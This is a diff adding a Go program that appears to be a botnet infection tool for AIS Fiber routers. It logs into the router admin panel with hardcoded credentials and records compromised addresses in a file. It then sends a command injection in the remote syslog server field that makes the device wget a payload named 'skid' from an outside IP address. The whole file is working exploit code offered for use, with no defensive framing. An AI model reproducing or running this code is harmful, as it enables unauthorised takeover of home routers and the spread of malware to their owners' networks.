@@ -1,0 +1,121 @@
+package main
+
+import (
+    "bufio"
+    "fmt"
+    "io/ioutil"
+    "net/http"
+    "os"
+    "strings"
+)
+
+func main() {
+    // Read IP address and port from ips.txt
+    file, err := os.Open("ips.txt")
+    if err != nil {
+        fmt.Println("Error opening ips.txt:", err)
+        return
+    }
+    defer file.Close()
+
+    scanner := bufio.NewScanner(file)
+    scanner.Scan()
+    ipAddressAndPort := scanner.Text()
+
+    loginURL := fmt.Sprintf("http://%s/", ipAddressAndPort)
+    loginPayload := "username=admin&password=db1fc58dc01b2885e3ace4dcc8abeacdfd47eab8562cd19d145f5b4542be6c35"
+
+    // Calculate Content-Length for the login payload
+    loginContentLength := fmt.Sprintf("%d", len(loginPayload))
+
+    // Send login request
+    loginReq, err := http.NewRequest("POST", loginURL, strings.NewReader(loginPayload))
+    if err != nil {
+        fmt.Println("Error creating login request:", err)
+        return
+    }
+
+    loginReq.Header.Add("Host", ipAddressAndPort)
+    loginReq.Header.Add("Cache-Control", "max-age=0")
+    loginReq.Header.Add("Upgrade-Insecure-Requests", "1")
+    loginReq.Header.Add("Origin", "http://"+ipAddressAndPort)
+    loginReq.Header.Add("Content-Type", "application/x-www-form-urlencoded")
+    loginReq.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36")
+    loginReq.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
+    loginReq.Header.Add("Referer", "http://"+ipAddressAndPort+"/page/login/login.html")
+    loginReq.Header.Add("Accept-Encoding", "gzip, deflate")
+    loginReq.Header.Add("Accept-Language", "en-US,en;q=0.9")
+    loginReq.Header.Add("Connection", "close")
+    loginReq.Header.Add("Content-Length", loginContentLength) // Set Content-Length header
+
+    loginRes, err := http.DefaultClient.Do(loginReq)
+    if err != nil {
+        fmt.Println("Error sending login request:", err)
+        return
+    }
+    defer loginRes.Body.Close()
+
+    loginResponseBody, err := ioutil.ReadAll(loginRes.Body)
+    if err != nil {
+        fmt.Println("Error reading login response body:", err)
+        return
+    }
+
+    // Check if the login was successful
+    if strings.Contains(string(loginResponseBody), "top.location.href = \"/index.html\";") {
+        fmt.Println("[AISFIBER] found successful login")
+
+        // Log successful login to successful.txt
+        logSuccessfulLogin(ipAddressAndPort)
+
+        // If login was successful, send the additional request
+        additionalURL := fmt.Sprintf("http://%s/cgi-bin/setup.cgi?page/management/mngt_loglevel.shtml", ipAddressAndPort)
+        additionalPayload := "InternetGatewayDevice.DeviceInfo.X_CT-COM_Syslog.Enable=1&InternetGatewayDevice.DeviceInfo.X_CT-COM_Syslog.Level=3&InternetGatewayDevice.X_CT-COM_Logger.LogTFTPServer=&InternetGatewayDevice.X_CT-COM_Logger.RemoteLogEnabled=1&InternetGatewayDevice.X_CT-COM_Logger.RemoteLogger=1.1.1.1`wget+http%3a//95.214.27.10/skid`&InternetGatewayDevice.X_CT-COM_Logger.RemotePort=514"
+
+        // Calculate Content-Length for the additional payload
+        additionalContentLength := fmt.Sprintf("%d", len(additionalPayload))
+
+        additionalReq, err := http.NewRequest("POST", additionalURL, strings.NewReader(additionalPayload))
+        if err != nil {
+            fmt.Println("Error creating additional request:", err)
+            return
+        }
+
+        additionalReq.Header.Add("Host", ipAddressAndPort)
+        additionalReq.Header.Add("Content-Length", additionalContentLength) // Set Content-Length header
+        additionalReq.Header.Add("Cache-Control", "max-age=0")
+        additionalReq.Header.Add("Upgrade-Insecure-Requests", "1")
+        additionalReq.Header.Add("Origin", "http://"+ipAddressAndPort)
+        additionalReq.Header.Add("Content-Type", "application/x-www-form-urlencoded")
+        additionalReq.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36")
+        additionalReq.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
+        additionalReq.Header.Add("Referer", "http://"+ipAddressAndPort+"/page/management/mngt_loglevel.shtml")
+        additionalReq.Header.Add("Accept-Encoding", "gzip, deflate")
+        additionalReq.Header.Add("Accept-Language", "en-US,en;q=0.9")
+        additionalReq.Header.Add("Connection", "close")
+
+        _, err = http.DefaultClient.Do(additionalReq)
+        if err != nil {
+            fmt.Println("Error sending additional request:", err)
+            return
+        }
+
+        fmt.Println("[AISFIBER] payload sent successfully")
+    } else {
+        fmt.Println("[AISFIBER] failed to log in")
+    }
+}
+
+func logSuccessfulLogin(ipAddressAndPort string) {
+    file, err := os.OpenFile("successful.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+    if err != nil {
+        fmt.Println("Error opening successful.txt:", err)
+        return
+    }
+    defer file.Close()
+
+    _, err = fmt.Fprintf(file, "%s\n", ipAddressAndPort)
+    if err != nil {
+        fmt.Println("Error writing to successful.txt:", err)
+    }
+}
